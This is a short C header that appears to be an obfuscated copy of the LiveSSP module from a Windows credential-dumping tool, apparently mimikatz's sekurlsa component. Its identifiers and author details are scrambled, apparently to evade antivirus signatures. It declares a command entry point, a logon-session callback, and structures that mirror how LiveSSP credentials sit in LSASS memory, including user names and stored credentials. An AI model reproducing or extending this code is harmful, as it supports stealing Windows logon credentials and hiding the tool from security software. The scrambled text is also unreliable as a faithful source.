/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m_seKuRlSa.h"
#if !defined(_M_ARM64)
KUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_liVeSsP_package;

NTSTATUS kuhl_m_seKuRlSa_liVeSsP(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_liVeSsP(IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _JlzW_LIVESSP_PRIMARY_CREDENTIAL
{
	ULONG isSupp;
	ULONG unk0;
	JlzW_GENERIC_PRIMARY_CREDENTIAL crEdentials;
} JlzW_LIVESSP_PRIMARY_CREDENTIAL, *PJlzW_LIVESSP_PRIMARY_CREDENTIAL;

typedef struct _JlzW_LIVESSP_LIST_ENTRY
{
	struct _JlzW_LIVESSP_LIST_ENTRY *Flink;
	struct _JlzW_LIVESSP_LIST_ENTRY *Blink;
	PVOID	unk0;
	PVOID	unk1;
	PVOID	unk2;
	PVOID	unk3;
	DWORD	unk4;
	DWORD	unk5;
	PVOID	unk6;
	LUID	LocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	PVOID	unk7;
	PJlzW_LIVESSP_PRIMARY_CREDENTIAL suppCreds;
} JlzW_LIVESSP_LIST_ENTRY, *PJlzW_LIVESSP_LIST_ENTRY;
#endif